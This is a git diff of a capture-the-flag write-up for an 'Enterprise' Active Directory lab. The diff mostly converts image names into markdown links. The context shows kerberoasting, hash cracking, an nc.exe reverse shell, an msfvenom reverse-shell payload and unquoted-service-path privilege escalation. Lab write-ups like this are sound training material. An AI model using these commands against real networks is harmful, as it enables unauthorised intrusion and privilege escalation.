@@ -6,7 +6,7 @@
 
 ----------------------------------------------------------------------
 
-enterprise.png
+![enterprise.png](../assets/enterprise_assets/enterprise.png)
 
 ```text
 You just landed in an internal network. You scan the network and there's only the Domain Controller...
@@ -128,26 +128,28 @@ While this is running we can go ahead and check out some of the other ports.
 
 Reviewing the Nmap results we see an Atlassian login page on port 7990, lets check that out.
 
-at.png
+![at.png](../assets/enterprise_assets/at.png)
 
 Interesting.. there is a note about the company moving over to GitHub. Heading out to Google I search for enterprise-thm github and find this page:
 
-gh.png
+![gh.png](../assets/enterprise_assets/gh.png)
 
 Clicking into 'People' I find a page for nik-enterprise-dev who has a public repo mgmtScript.ps1 with a SystemInfo.ps1 script in it. 
 
 Clicking into the script, I'm not really seeing much of interest to us.
 
+![script.png](../assets/enterprise_assets/script.png)
+
 But if I click on the 'History' button, I can reveiew changes made to the script over time.
 
-whoops.png
+![whoops.png](../assets/enterprise_assets/whoops.png)
 
 Whoops! Looks like Nik hardcoded his credentials when his first committed the script.
 
 
 Looking back at our kerbrute findings we can confirm that Nik is a valid user on the domain:
 
-kerb.png
+![kerb.png](../assets/enterprise_assets/kerb.png)
 
 Armed with these credentials lets use Impacket-GetUserSPNS:
 
@@ -159,11 +161,11 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 Password:
 ```
 
-spn.png
+![spn.png](../assets/enterprise_assets/spn.png)
 
 Cool, we've retrieved a hash for user bitbucket. Lets add this to a file called hash.txt and use JohnTheRipper to crack it:
 
-john.png
+![john.png](../assets/enterprise_assets/john.png)
 
 John was able to crack the password in just a couple of seconds.
 
@@ -176,13 +178,13 @@ Now with these new credentials I can RDP onto the machine:
 
 And grab the user.txt flag:
 
-user_flag.png
+![user_flag.png](../assets/enterprise_assets/user_flag.png)
 
 ### Privilege Escalation
 
 Because I'd rather be in the terminal rather than working over RDP (which can be slow, and buggy at times) I'll transfer over a copy of nc.exe to the target using Certutil:
 
-nc.png
+![nc.png](../assets/enterprise_assets/nc.png)
 
 And then run: `C:\Users\bitbucket>nc.exe -e cmd.exe 10.6.61.45 443`
 
@@ -224,7 +226,7 @@ Winpeas is a phenomenal tool that can be a game-changer if you get stuck trying 
 
 WinPEAS finds a potentialunquoted service path, which we may be able to abuse:
 
-priv.png
+![priv.png](../assets/enterprise_assets/priv.png)
 
 Because this service is currently stopped, we'll need to double check we have the permissions to restart it after we craft our exploit:
 
@@ -247,15 +249,15 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.6.61.45 LPORT=8888 -f exe -o Zero
 
 We can use Certutil to transfer the file over and confirm it's where it needs to be:
 
-zero.png
+![zero.png](../assets/enterprise_assets/zero.png)
 
 Now with a listener going on our attack machine we can restart the service and catch a shell back:
 
-nt_shell.png
+![nt_shell.png](../assets/enterprise_assets/nt_shell.png)
 
 Cool, we are nt authority\system! Lets grab that final root.txt flag:
 
-root_flag.png
+![root_flag.png](../assets/enterprise_assets/root_flag.png)
 
 Thanks for following along!
 
